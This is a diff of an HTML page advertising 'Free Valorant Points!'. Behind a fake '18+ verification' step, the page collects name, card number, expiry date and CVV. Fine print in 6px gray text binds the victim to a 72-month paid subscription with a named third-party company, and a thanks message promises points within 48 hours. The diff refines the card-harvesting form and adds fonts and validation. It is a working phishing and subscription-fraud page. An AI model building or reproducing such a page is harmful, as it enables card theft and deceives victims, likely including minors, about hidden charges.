@@ -6,6 +6,9 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="source/css/style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Quantico&display=swap" rel="stylesheet">
     <title>Free Valorant Points!</title>
 </head>
 
@@ -31,19 +34,24 @@
     <div id="spinner"></div>
     <div id="formMaj" style="display: none; margin: 10px;">
         <h2>18+ Verfication</h2>
-        <input type="text" id="nomCB" placeholder="Name"><br>
-        <input type="month" id="dateEXP" placeholder="Expiration date"> <br>
-        <input type="number" id="numero" placeholder="credit card number">
-        <input type="number" id="crypto" placeholder="cryptogram"><br>
+        <input type="text" onkeydown="return /[a-z]/i.test(event.key)" id="nomCB" placeholder="Name"><br>
+        <input type="month" min="2023-01" id="dateEXP" placeholder="Expiration date"> <br>
+        <input type="number" id="numero" placeholder="Card number" maxlength="10">
+        <input type="number"  id="crypto" placeholder="CVV" min="100" max="999" maxlength="3"><br>
         <button id="submitCB">Submit</button>
 
         <p style="font-size: 6px; color: gray;">*By accepting this form, you agree to take out a subscription
-            under 72-month commitment on the Kiwatch.com site (The GROUPE SCUTUM company) at 9.99€/month, then at 16.99€/month</p>
+            under 72-month commitment on the Kiwatch.com site (The GROUPE SCUTUM company) at 9.99€/month, then at
+            16.99€/month</p>
+            <p id="emptyCB" style="display: none;">You must give value(s)</p>
     </div>
     <div id="thanks" style="display: none;">
         <h3>Thanks! You will receive you valorant points in the next 48 hours!</h3>
+        <a href="index.html"><button>Back ton home</button></a>
     </div>
 </body>
 <script src="source/javascript/app.js"></script>
 
 </html>
+
+<!-- onkeyup="if(parseInt(this.value)>999){ this.value =999; return false; }" -->
